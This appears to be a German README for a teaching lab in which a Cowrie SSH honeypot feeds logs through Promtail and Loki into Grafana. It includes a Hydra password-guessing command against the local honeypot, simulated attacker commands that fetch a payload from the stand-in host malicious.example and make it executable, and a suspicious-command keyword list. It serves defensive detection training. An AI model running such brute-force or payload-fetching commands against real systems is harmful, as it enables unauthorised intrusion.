# Cybersecurity-Honeypot-Plattform

## Projektübersicht

Dieses Projekt stellt eine vollständig automatisierte Laborumgebung zur Erkennung und Visualisierung von SSH-Angriffen bereit. Ein Cowrie-Honeypot simuliert einen SSH-Server und zeichnet Verbindungsversuche, Anmeldungen und ausgeführte Befehle auf. Promtail liest die erzeugten JSON-Protokolle und übermittelt sie an Loki. Grafana verwendet Loki als Datenquelle und stellt die erfassten Ereignisse in einem vorbereiteten Dashboard dar.

Die komplette Umgebung läuft in einer Ubuntu-VM. Vagrant erstellt und konfiguriert die VM, installiert Docker und startet die Container automatisch mit Docker Compose. Dadurch kann das Projekt auf einem neuen Computer mit einem einzigen Vagrant-Befehl gestartet werden.

> Diese Umgebung ist ausschliesslich für Schulungs- und Testzwecke bestimmt. Tests dürfen nur gegen dieses eigene Labor oder gegen Systeme durchgeführt werden, für die eine ausdrückliche Berechtigung vorliegt.

## Ziel des Projekts

Das Projekt zeigt den vollständigen Weg eines sicherheitsrelevanten Ereignisses:

1. Ein Client verbindet sich mit dem simulierten SSH-Dienst.
2. Cowrie zeichnet die Verbindung und die Aktivitäten als JSON-Ereignisse auf.
3. Promtail liest die Protokolle und sendet sie an Loki.
4. Loki speichert und indexiert die Ereignisse.
5. Grafana fragt die Daten mit LogQL ab und visualisiert sie.

Mit der Plattform können unter anderem Portscans, fehlgeschlagene Anmeldungen, erfolgreiche Honeypot-Anmeldungen und verdächtige Befehle untersucht werden.

## Architektur

![Datenfluss der Honeypot-Plattform](docs/project-honeypot-teko-gr..drawio.png)

```text
SSH-Client -> Cowrie -> JSON-Protokoll -> Promtail -> Loki -> Grafana
   Test          :2222                              :3100     :3000
```

Die Anwendung besteht aus folgenden Komponenten:

| Komponente | Aufgabe |
| --- | --- |
| **Vagrant** | Erstellt die Ubuntu-VM und führt die Provisionierung aus. |
| **Docker Compose** | Erstellt und verwaltet die vier Container der Anwendung. |
| **Cowrie** | Simuliert einen SSH-Server und protokolliert Angreiferaktivitäten. |
| **Promtail** | Liest die JSON-Protokolle von Cowrie und sendet sie an Loki. |
| **Loki** | Speichert die Protokolle und stellt sie für LogQL-Abfragen bereit. |
| **Grafana** | Visualisiert die in Loki gespeicherten Ereignisse. |

Cowrie, Loki und Grafana sind über die Ports `2222`, `3100` und `3000` erreichbar. Die persistenten Anwendungsdaten werden in benannten Docker-Volumes gespeichert.

## Voraussetzungen

Für den empfohlenen Start mit VirtualBox werden folgende Programme und Ressourcen benötigt:

- Git
- Vagrant 2.4 oder neuer
- VirtualBox 7.x
- Aktivierte Hardware-Virtualisierung im BIOS/UEFI
- Mindestens 4 GB freier Arbeitsspeicher
- Ungefähr 10 GB freier Speicherplatz
- Internetzugang für den ersten Download

Optional wird auch Parallels Desktop mit dem Plugin `vagrant-parallels` unterstützt.

## Installation und Start mit VirtualBox

Repository klonen und in das Vagrant-Verzeichnis wechseln:

```bash
git clone <repository-url>
cd cybersecurity-honeypot-platform/honeypot-vm
```

VM erstellen und die vollständige Plattform starten:

```bash
vagrant up --provider=virtualbox
```

Beim ersten Start lädt Vagrant die Ubuntu-Box herunter. Danach werden Docker und die benötigten Werkzeuge installiert. Docker Compose lädt die Container-Images, erstellt Cowrie und startet die Plattform. Der erste Start kann deshalb mehrere Minuten dauern.

Für Parallels lautet der Startbefehl:

```bash
vagrant up --provider=parallels
```

## Erreichbare Dienste

| Dienst | Adresse | Zugangsdaten |
| --- | --- | --- |
| Grafana | http://localhost:3000 | `admin` / `admin` |
| Cowrie SSH über Portweiterleitung | `localhost:2222` | `root` / `toor` |
| Cowrie SSH über das private VM-Netz | `192.168.56.10:2222` | `root` / `toor` |
| Loki-Status | http://localhost:3100/ready | Keine |

Die verwendeten Zugangsdaten sind absichtlich einfach, da sie nur für die isolierte Laborumgebung vorgesehen sind.

## Funktionsprüfung nach dem Start

### 1. Container überprüfen

```bash
vagrant ssh -c "cd /project && docker compose ps"
```

Erwartetes Ergebnis: Die vier Dienste `cowrie`, `loki`, `promtail` und `grafana` besitzen den Status `Up`.

### 2. Loki überprüfen

Im Browser öffnen:

```text
http://localhost:3100/ready
```

Erwartetes Ergebnis:

```text
ready
```

Loki benötigt nach dem Start möglicherweise einige Sekunden, bis dieser Status erscheint.

### 3. Grafana öffnen

Im Browser öffnen:

```text
http://localhost:3000
```

Anmeldung:

```text
Benutzername: admin
Passwort:      admin
```

In Grafana ist Loki bereits als Standard-Datenquelle eingerichtet. Das vorbereitete Dashboard **Cowrie Honeypot Overview** befindet sich im Ordner **Honeypot**.

Nach der Durchführung eines Tests kann das Dashboard manuell aktualisiert werden, um die erfassten Ereignisse anzuzeigen. Die einzelnen Tests werden im nächsten Kapitel beschrieben.

## Testszenarien

Die folgenden Tests werden auf dem Hostsystem ausgeführt. Sie dürfen nur gegen die eigene Honeypot-VM verwendet werden.

### Test 1: Portscan mit Nmap

Nmap ist nur für diesen optionalen Scan-Test erforderlich und wird nicht zum Betrieb der Honeypot-Plattform benötigt.

Nmap auf Ubuntu oder Debian installieren:

```bash
sudo apt update
sudo apt install -y nmap
```
Nmap auf MacOS installieren:

```bash
brew install nmap
```

Installation überprüfen:

```bash
nmap --version
```

```bash
nmap -sV -p 2222 127.0.0.1
```

Der Scan erkennt einen SSH-Dienst auf Port `2222` und erzeugt in Cowrie mindestens ein Verbindungsereignis.

Erwartete Cowrie-Ereignisse:

```text
cowrie.session.connect
cowrie.client.version
cowrie.session.closed
```

Erwartete Anzeige in Grafana:

- Der Wert im Panel **SSH Sessions** steigt.
- Im Panel **Attack Events Over Time** erscheinen neue Ereignisse.
- Es erscheinen normalerweise keine ausgeführten Befehle, weil Nmap keine SSH-Sitzung mit Befehlen öffnet.

### Test 2: Anmeldeversuche mit Hydra

Hydra ist nur für diesen optionalen Angriffstest erforderlich und wird nicht zum Betrieb der Honeypot-Plattform benötigt.

Hydra auf Ubuntu oder Debian installieren:

```bash
sudo apt update
sudo apt install -y hydra
```
Hydra auf MacOS installieren:

```bash
brew install hydra
```

Installation überprüfen:

```bash
hydra -h
```

Eine kleine Passwortliste erstellen:

```bash
printf "admin\npassword\n123456\ntoor\n" > passwords.txt
```

Hydra gegen den Cowrie-Honeypot ausführen:

```bash
hydra -l root -P passwords.txt ssh://127.0.0.1:2222
```

Erwartete Cowrie-Ereignisse:

```text
cowrie.login.failed
cowrie.login.success
```

Erwartete Anzeige in Grafana:

- Das Panel **Failed Logins** zeigt die fehlgeschlagenen Versuche.
- Das Panel **Successful Logins** zeigt erfolgreiche Versuche.
- **Attack Events Over Time** zeigt mehrere Ereignisse in kurzer Zeit.
- Der gültige Laborzugang `root` / `toor` kann als erfolgreiche Anmeldung erkannt werden.

### Test 3: SSH-Anmeldung und verdächtige Befehle

Mit Cowrie verbinden:

```bash
ssh -p 2222 root@127.0.0.1
```

Passwort:

```text
toor
```

Innerhalb der simulierten Cowrie-Shell können beispielsweise folgende Befehle eingegeben werden:

```bash
whoami
uname -a
id
pwd
ls -la
wget http://malicious.example/payload.sh
curl http://malicious.example/payload.sh -o /tmp/payload.sh
chmod +x /tmp/payload.sh
exit
```

Die Befehle werden nur innerhalb des Honeypots simuliert und als Ereignisse aufgezeichnet.

Erwartetes Cowrie-Ereignis:

```text
cowrie.command.input
```

Erwartete Anzeige in Grafana:

- Das Panel **Executed Commands** zeigt die eingegebenen Befehle.
- Das Panel **Suspicious Commands** zeigt insbesondere Befehle mit `wget`, `curl`, `chmod` oder `payload`.
- Die Anzahl der SSH-Sitzungen und der Ereignisse steigt.

## Manuelle Kontrolle der Ereignisse

In Grafana kann unter **Explore** die Loki-Datenquelle ausgewählt werden. Nützliche LogQL-Abfragen sind:

Alle Cowrie-Ereignisse:

```logql
{job="cowrie"}
```

SSH-Verbindungen:

```logql
{job="cowrie", eventid="cowrie.session.connect"}
```

Fehlgeschlagene Anmeldungen:

```logql
{job="cowrie", eventid="cowrie.login.failed"}
```

Ausgeführte Befehle:

```logql
{job="cowrie", eventid="cowrie.command.input"}
```

## Bedienung der VM

```bash
# VM anhalten
vagrant halt

# VM erneut starten
vagrant up

# Shell innerhalb der VM öffnen
vagrant ssh

# Status der Container anzeigen
vagrant ssh -c "cd /project && docker compose ps"

# Protokolle der Container anzeigen
vagrant ssh -c "cd /project && docker compose logs --tail=100"

# Provisionierung erneut ausführen
vagrant provision
```

Auf Parallels wird das Projekt mit RSync in die VM kopiert. Änderungen am Projekt können ohne Neustart übertragen und angewendet werden:

```bash
vagrant rsync
vagrant ssh -c "cd /project && docker compose up -d --build"
```

VirtualBox verwendet dagegen einen direkt eingebundenen Projektordner.

## Zurücksetzen der Umgebung

Die VM kann vollständig entfernt werden:

```bash
vagrant destroy -f
```

Beim nächsten `vagrant up` wird die gesamte Umgebung neu erstellt. Dabei werden auch die Docker-Volumes der entfernten VM neu angelegt. Manuell erstellte Grafana-Dashboards sollten deshalb vorher exportiert werden.

## Sicherheitshinweis

Der Honeypot verwendet absichtlich schwache Beispiel-Zugangsdaten und ist nicht als produktiv abgesichertes System konzipiert. Die Plattform sollte nicht ohne zusätzliche Schutzmassnahmen direkt aus dem Internet erreichbar gemacht werden. Alle beschriebenen Scan- und Angriffstests dürfen nur in dieser eigenen Laborumgebung oder mit ausdrücklicher Genehmigung durchgeführt werden.
